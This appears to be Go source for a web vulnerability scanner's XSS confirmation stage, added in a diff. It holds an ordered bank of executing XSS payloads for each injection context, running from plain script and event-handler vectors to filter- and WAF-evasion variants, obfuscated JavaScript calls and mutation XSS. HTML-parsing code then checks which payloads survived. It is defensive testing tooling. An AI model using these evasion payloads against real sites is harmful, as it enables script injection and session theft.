@@ -1,0 +1,384 @@
+package scanner
+
+import (
+	"strings"
+
+	xhtml "golang.org/x/net/html"
+)
+
+// XSS executing-payload bank for the active DAST confirm stage.
+//
+// The engine first proves *HTML injection* with a benign marker element, then
+// must prove *execution* with a payload the application did NOT filter — otherwise
+// the reported PoC is a real bug with a dead payload ("finds XSS but no popup").
+// This bank supplies, per context, an ORDERED ladder of real executing payloads:
+// the cleanest vector first, then progressively more filter/WAF-evasive variants
+// (case mixing, slash separators, rare tags, rare event handlers, no-quote forms).
+// The confirm stage fires them in order and reports the FIRST whose element +
+// handler survive UNENCODED as live markup — i.e. one that actually pops.
+//
+// Every JS body is alert(document.domain) so a triager instantly sees WHICH origin
+// executed, and the token/elem let the browserless confirm assert the exact
+// executing bytes survived (not just that some tag formed).
+
+// xssExecPayload is one executing vector.
+type xssExecPayload struct {
+	Payload string // full injection value
+	Elem    string // element name that must form as a live start tag
+	Token   string // lowercased substring (handler/scheme) that must survive raw
+}
+
+// xssAlert is the JS body used across the bank.
+const xssAlert = "alert(document.domain)"
+
+// htmlTextExecLadder returns executing payloads for an HTML-TEXT context (or any
+// context already broken out into HTML text via a prefix). Ordered cleanest →
+// most evasive so the report shows the simplest working vector, but a filtered app
+// still yields a bypass that pops. Curated from the well-known XSS vector families
+// (PortSwigger / HTML5 cheat sheets): auto-firing elements, then WAF-evasion
+// (slash/case/whitespace/no-quote), then rare tags & events, then JS-call
+// obfuscation for filters that target the string "alert(".
+func htmlTextExecLadder() []xssExecPayload {
+	return []xssExecPayload{
+		// ── primary auto-firing vectors (no interaction) ──
+		{`<svg onload=` + xssAlert + `>`, "svg", "onload"},
+		{`<img src=x onerror=` + xssAlert + `>`, "img", "onerror"},
+		{`<script>` + xssAlert + `</script>`, "script", xssAlert},
+		{`<svg><script>` + xssAlert + `</script></svg>`, "script", xssAlert},
+		{`<details open ontoggle=` + xssAlert + `>`, "details", "ontoggle"},
+		{`<video autoplay><source onerror=` + xssAlert + `></video>`, "video", "onerror"},
+		{`<audio src=x onerror=` + xssAlert + `>`, "audio", "onerror"},
+		{`<body onload=` + xssAlert + `>`, "body", "onload"},
+		{`<svg><animate onbegin=` + xssAlert + ` attributeName=x dur=1s>`, "animate", "onbegin"},
+		{`<marquee onstart=` + xssAlert + `>x</marquee>`, "marquee", "onstart"},
+		{`<object data="javascript:` + xssAlert + `">`, "object", "javascript:"},
+		{`<iframe srcdoc="&lt;script&gt;` + xssAlert + `&lt;/script&gt;">`, "iframe", "srcdoc"},
+		{`<iframe srcdoc="&lt;svg onload=` + xssAlert + `&gt;">`, "iframe", "srcdoc"},
+		{`<svg><set attributeName=x to=y onbegin=` + xssAlert + `>`, "set", "onbegin"},
+		// onpageshow fires on every load (including back/forward-cache restores) —
+		// an alternative load event for filters that block onload by name.
+		{`<body onpageshow=` + xssAlert + `>`, "body", "onpageshow"},
+		// animateTransform is a distinct SVG animation element from <animate>/<set>,
+		// so a tag/handler allowlist tuned to those still misses onbegin here.
+		{`<svg><animateTransform onbegin=` + xssAlert + ` attributeName=transform dur=1s>`, "animatetransform", "onbegin"},
+		// error handler on <object>/<embed> — plugin-element load-failure vectors a
+		// media-tag-only allowlist does not cover.
+		{`<object onerror=` + xssAlert + ` data=x>`, "object", "onerror"},
+		{`<embed src=x onerror=` + xssAlert + `>`, "embed", "onerror"},
+		// ── auto-focus vectors (fire without a mouse) ──
+		{`<input autofocus onfocus=` + xssAlert + `>`, "input", "onfocus"},
+		{`<select autofocus onfocus=` + xssAlert + `>`, "select", "onfocus"},
+		{`<textarea autofocus onfocus=` + xssAlert + `>`, "textarea", "onfocus"},
+		{`<keygen autofocus onfocus=` + xssAlert + `>`, "keygen", "onfocus"},
+		// ── WAF-evasion: slash separators, case mixing, whitespace, no-space ──
+		{`<svg/onload=` + xssAlert + `>`, "svg", "onload"},
+		{`<sVg oNloAd=` + xssAlert + `>`, "svg", "onload"},
+		{`<iMg sRc=x oNerRor=` + xssAlert + `>`, "img", "onerror"},
+		{"<svg\tonload=" + xssAlert + ">", "svg", "onload"},
+		{"<svg\nonload=" + xssAlert + ">", "svg", "onload"},
+		{"<svg\fonload=" + xssAlert + ">", "svg", "onload"},
+		{`<svg><a><animate attributeName=href values=javascript:` + xssAlert + ` /><text x=20 y=20>click</text></a>`, "animate", "javascript:"},
+		{`<svg onload=` + xssAlert + `//`, "svg", "onload"},
+		// In an HTML document the tokenizer aliases the obsolete <image> spelling
+		// to a live <img> element. Correlate against the parsed name, not the source
+		// spelling, so this evasive vector remains detectable.
+		{`<image src=x onerror=` + xssAlert + `>`, "img", "onerror"},
+		// ── rare tags / rare events (bypass tag/handler allowlists) ──
+		{`<xss id=x tabindex=1 onfocusin=` + xssAlert + `></xss>`, "xss", "onfocusin"},
+		{`<div onpointerenter=` + xssAlert + `>x</div>`, "div", "onpointerenter"},
+		{`<div tabindex=1 autofocus onfocusin=` + xssAlert + `>x</div>`, "div", "onfocusin"},
+		{`<style onload=` + xssAlert + `></style>`, "style", "onload"},
+		{`<svg><set attributeName=x onbegin=` + xssAlert + `>`, "set", "onbegin"},
+		{`<form><button formaction=javascript:` + xssAlert + `>x`, "button", "formaction"},
+		// ── JS-call obfuscation (filter targets the literal "alert(") ──
+		{`<svg onload=confirm(document.domain)>`, "svg", "confirm("},
+		{`<svg onload=print()>`, "svg", "print("},
+		{`<svg onload=(alert)(document.domain)>`, "svg", "(alert)"},
+		{"<svg onload=top[`al`+`ert`](document.domain)>", "svg", "onload"},
+		{`<svg onload=window['al'+'ert'](document.domain)>`, "svg", "onload"},
+		{`<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>`, "svg", "eval("},
+		// fromCharCode spells "alert" from numeric codes — defeats a filter that
+		// blocks the literal substring "alert(" (case-insensitively, backtick-
+		// and bracket-concat too) but cannot see through character-code math.
+		{`<svg onload=this[String.fromCharCode(97,108,101,114,116)](document.domain)>`, "svg", "onload"},
+		// Function()/setTimeout(string) are eval-like: the actual call site never
+		// contains the word "alert" at all, only inside a string literal argument.
+		{`<svg onload=Function('alert(document.domain)')()>`, "svg", "Function("},
+		{`<svg onload=setTimeout('alert(document.domain)')>`, "svg", "setTimeout("},
+		// Constructor-chain: reach Function() through an array method's .constructor
+		// with no literal "Function"/"eval"/"alert(" call token in the source —
+		// defeats a filter that blocks all of those names.
+		{`<svg onload=[]["filter"]["constructor"]('alert(document.domain)')()>`, "svg", "onload"},
+		// globalThis/self indirection for filters anchored on "window.".
+		{`<svg onload=globalThis['ale'+'rt'](document.domain)>`, "svg", "onload"},
+		// ── mutation XSS (mXSS): the browser's own re-parsing behavior — not a
+		// string trick — turns "inert" markup into a live element. <noscript> is
+		// parsed as RAW TEXT only when the scripting flag is enabled (an ordinary
+		// browser tab); a static/offline parser or a sanitizer's inert document
+		// commonly parses it as regular markup instead. So the literal
+		// "</noscript>" sequence sitting inside what looks like a quoted
+		// attribute value actually closes the tag early in a real browser, and
+		// everything after it becomes live markup — cure53/PortSwigger mXSS
+		// research. Deliberately harmless against a static parser (no early
+		// close ⇒ inert text, no false positive); only a real browser proves it.
+		{`<noscript><p title="</noscript><img src=x onerror=` + xssAlert + `>">`, "img", "onerror"},
+	}
+}
+
+// prefixLadder prepends a context breakout prefix to every HTML-text vector and
+// remaps the (elem, token) unchanged, so the survival check stays exact.
+func prefixLadder(prefix string) []xssExecPayload {
+	base := htmlTextExecLadder()
+	out := make([]xssExecPayload, 0, len(base))
+	for _, p := range base {
+		out = append(out, xssExecPayload{Payload: prefix + p.Payload, Elem: p.Elem, Token: p.Token})
+	}
+	return out
+}
+
+// buildExecPayloads returns the ordered executing-payload ladder for the proven
+// reflection context. Attribute/URL/JS/CSS contexts get the correct breakout
+// prefix so the vector escapes into HTML text; HTML text uses the ladder directly.
+func buildExecPayloads(a ReflectionAnalysis) []xssExecPayload {
+	switch a.Context {
+	case CtxHTMLText:
+		return htmlTextExecLadder()
+	case CtxQuotedAttr, CtxURL:
+		q := `"`
+		if a.Quote == '\'' {
+			q = "'"
+		}
+		// close the quoted value, close the tag, then a fresh executing element.
+		ladder := prefixLadder(q + `>`)
+		if a.Context == CtxURL {
+			// href/src sinks also execute a javascript: scheme on click/navigation —
+			// no tag needed. Offered first as the canonical URL-sink vector. The
+			// tab-broken second form parses identically (the URL spec strips ASCII
+			// tab/newline before scheme-checking) while evading a filter that
+			// regex-matches the literal string "javascript:".
+			ladder = append([]xssExecPayload{
+				{`javascript:` + xssAlert, "", "javascript:" + xssAlert},
+				{"jav\tascript:" + xssAlert, "", "javascript:" + xssAlert},
+			}, ladder...)
+		}
+		return ladder
+	case CtxUnquotedAttr:
+		// no quote to break: a space starts a new attribute; also full tag breakout.
+		// A tag-NAME-position reflection (AttrName=="") is not reliably focusable
+		// as an invented/unknown element, so autofocus may never fire there; the
+		// close-then-fresh-element ladder works regardless of what "tag" ends up
+		// being formed and goes first when that is the likely case.
+		focusBased := xssExecPayload{` autofocus onfocus=` + xssAlert + ` x=`, "", "onfocus=" + xssAlert}
+		closeThenFresh := prefixLadder(`>`)
+		if a.AttrName == "" {
+			return append(closeThenFresh, focusBased)
+		}
+		return append([]xssExecPayload{focusBased}, closeThenFresh...)
+	case CtxEventHandler:
+		// Nested JavaScript-in-HTML context. Tagless JS breakouts require runtime
+		// proof; an HTML-quote breakout also gets the parsed-element ladder.
+		direct := []xssExecPayload{{`';` + xssAlert + `//`, "", `';` + xssAlert}}
+		switch a.JSQuote {
+		case '"':
+			direct[0] = xssExecPayload{`";` + xssAlert + `//`, "", `";` + xssAlert}
+		case '`':
+			direct[0] = xssExecPayload{"${" + xssAlert + "}", "", "${" + xssAlert}
+		case 0:
+			// No JS quote at all around the reflection — it sits in a bare
+			// statement/expression position (e.g. onclick=MARKER or
+			// onclick=doStuff(MARKER)), not inside an existing string. A
+			// leading quote there OPENS an unterminated string (a syntax
+			// error that never executes) instead of closing one. Mirrors
+			// CtxJSExpr's bare statement-separator payload below.
+			direct[0] = xssExecPayload{`;` + xssAlert + `//`, "", `;` + xssAlert}
+		}
+		if a.JSQuote != 0 && strings.Contains(a.Escaped, string(a.JSQuote)) && strings.Contains(a.Surviving, `\`) {
+			direct = append([]xssExecPayload{{`\` + direct[0].Payload, "", `\` + direct[0].Token}}, direct...)
+		}
+		if a.Quote != 0 {
+			direct = append(direct, prefixLadder(string(a.Quote)+`>`)...)
+		} else {
+			// Fully unquoted attribute value too (onclick=MARKER, no HTML
+			// quote at all) — a bare `>` still ends it and closes the tag,
+			// same as CtxUnquotedAttr's own ladder. Previously this branch was
+			// skipped entirely whenever a.Quote==0, leaving ONLY the single
+			// in-place JS payload above as a candidate for this combination.
+			direct = append(direct, prefixLadder(`>`)...)
+		}
+		return direct
+	case CtxJSString:
+		// close the string/stmt then run; also </script> breakout into HTML text.
+		direct := []xssExecPayload{
+			{`';` + xssAlert + `//`, "", `';` + xssAlert},
+			{`";` + xssAlert + `//`, "", `";` + xssAlert},
+		}
+		if a.JSQuote != 0 && strings.Contains(a.Escaped, string(a.JSQuote)) && strings.Contains(a.Surviving, `\`) {
+			payload := `\` + string(a.JSQuote) + `;` + xssAlert + `//`
+			direct = append([]xssExecPayload{{payload, "", `\` + string(a.JSQuote) + `;` + xssAlert}}, direct...)
+		}
+		return append(direct, prefixLadder(`</script>`)...)
+	case CtxJSExpr:
+		return append([]xssExecPayload{
+			{`;` + xssAlert + `//`, "", `;` + xssAlert},
+		}, prefixLadder(`</script>`)...)
+	case CtxCSS:
+		return prefixLadder(`</style>`)
+	case CtxComment:
+		return prefixLadder(`-->`)
+	case CtxRCDATA, CtxRAWTEXT:
+		close := a.CloseTag
+		if close == "" {
+			close = `</textarea>`
+		}
+		return prefixLadder(close)
+	case CtxSrcDoc:
+		// srcdoc is a nested document. Try direct nested markup first, then fall
+		// back to breaking the outer attribute when its quote survives.
+		ladder := htmlTextExecLadder()
+		if a.Quote != 0 {
+			ladder = append(ladder, prefixLadder(string(a.Quote)+`>`)...)
+		}
+		return ladder
+	default:
+		return htmlTextExecLadder()
+	}
+}
+
+// execPayloadSurvived reports whether the executing primitive from p survived on
+// the SAME parsed element/subtree in the response. Element-name and token checks
+// must never be independent: a page may already contain a legitimate <svg> while
+// reflecting our URL-encoded "onload" text inside og:url. The old global checks
+// joined those unrelated facts and produced a false positive.
+//
+// We parse p to derive its exact executable signal (event-handler name+value,
+// javascript: URL, srcdoc, or script body), then require that signal beneath a
+// live response element named p.Elem. Percent-encoded or quoted-attribute text
+// does not become such a node. Tagless JS/URL vectors still require runtime proof.
+func execPayloadSurvived(body string, p xssExecPayload) bool {
+	if p.Elem == "" {
+		// Exact tagless text survival is still only reflection. Whether a JS
+		// expression/scheme/handler is syntactically live requires runtime proof.
+		return false
+	}
+	want := expectedExecSignals(p)
+	if len(want) == 0 {
+		return false
+	}
+	doc, err := xhtml.Parse(strings.NewReader(body))
+	if err != nil {
+		return false
+	}
+	return elementSubtreeHasSignals(doc, strings.ToLower(strings.TrimSpace(p.Elem)), want)
+}
+
+type execSignal struct {
+	kind  string // event | javascript-url | srcdoc | script
+	name  string // attribute name for attribute-backed signals
+	value string
+}
+
+// expectedExecSignals parses the payload in a normal HTML body and extracts only
+// browser-executable primitives. Generic attributes such as src=x/autofocus are
+// deliberately ignored: they cannot prove that JavaScript survived.
+func expectedExecSignals(p xssExecPayload) []execSignal {
+	doc, err := xhtml.Parse(strings.NewReader("<!doctype html><html><body>" + p.Payload + "</body></html>"))
+	if err != nil {
+		return nil
+	}
+	var target *xhtml.Node
+	var find func(*xhtml.Node)
+	find = func(n *xhtml.Node) {
+		if target != nil {
+			return
+		}
+		if n.Type == xhtml.ElementNode && strings.EqualFold(n.Data, p.Elem) {
+			target = n
+			return
+		}
+		for ch := n.FirstChild; ch != nil; ch = ch.NextSibling {
+			find(ch)
+		}
+	}
+	find(doc)
+	if target == nil {
+		return nil
+	}
+	return collectExecSignals(target)
+}
+
+func collectExecSignals(root *xhtml.Node) []execSignal {
+	var out []execSignal
+	var walk func(*xhtml.Node)
+	walk = func(n *xhtml.Node) {
+		if n.Type == xhtml.ElementNode {
+			for _, attr := range n.Attr {
+				name := strings.ToLower(strings.TrimSpace(attr.Key))
+				value := strings.TrimSpace(attr.Val)
+				switch {
+				case strings.HasPrefix(name, "on") && len(name) > 2 && value != "":
+					out = append(out, execSignal{kind: "event", name: name, value: value})
+				case name == "srcdoc" && value != "":
+					out = append(out, execSignal{kind: "srcdoc", name: name, value: value})
+				case value != "" && strings.HasPrefix(strings.ToLower(value), "javascript:"):
+					out = append(out, execSignal{kind: "javascript-url", name: name, value: value})
+				}
+			}
+			if strings.EqualFold(n.Data, "script") {
+				if value := strings.TrimSpace(nodeText(n)); value != "" {
+					out = append(out, execSignal{kind: "script", value: value})
+				}
+			}
+		}
+		for ch := n.FirstChild; ch != nil; ch = ch.NextSibling {
+			walk(ch)
+		}
+	}
+	walk(root)
+	return out
+}
+
+func nodeText(root *xhtml.Node) string {
+	var b strings.Builder
+	var walk func(*xhtml.Node)
+	walk = func(n *xhtml.Node) {
+		if n.Type == xhtml.TextNode {
+			b.WriteString(n.Data)
+		}
+		for ch := n.FirstChild; ch != nil; ch = ch.NextSibling {
+			walk(ch)
+		}
+	}
+	walk(root)
+	return b.String()
+}
+
+func elementSubtreeHasSignals(root *xhtml.Node, element string, want []execSignal) bool {
+	if root.Type == xhtml.ElementNode && strings.EqualFold(root.Data, element) {
+		got := collectExecSignals(root)
+		if allExecSignalsPresent(got, want) {
+			return true
+		}
+	}
+	for ch := root.FirstChild; ch != nil; ch = ch.NextSibling {
+		if elementSubtreeHasSignals(ch, element, want) {
+			return true
+		}
+	}
+	return false
+}
+
+func allExecSignalsPresent(got, want []execSignal) bool {
+	for _, expected := range want {
+		matched := false
+		for _, actual := range got {
+			if actual.kind == expected.kind && actual.name == expected.name && actual.value == expected.value {
+				matched = true
+				break
+			}
+		}
+		if !matched {
+			return false
+		}
+	}
+	return len(want) > 0
+}
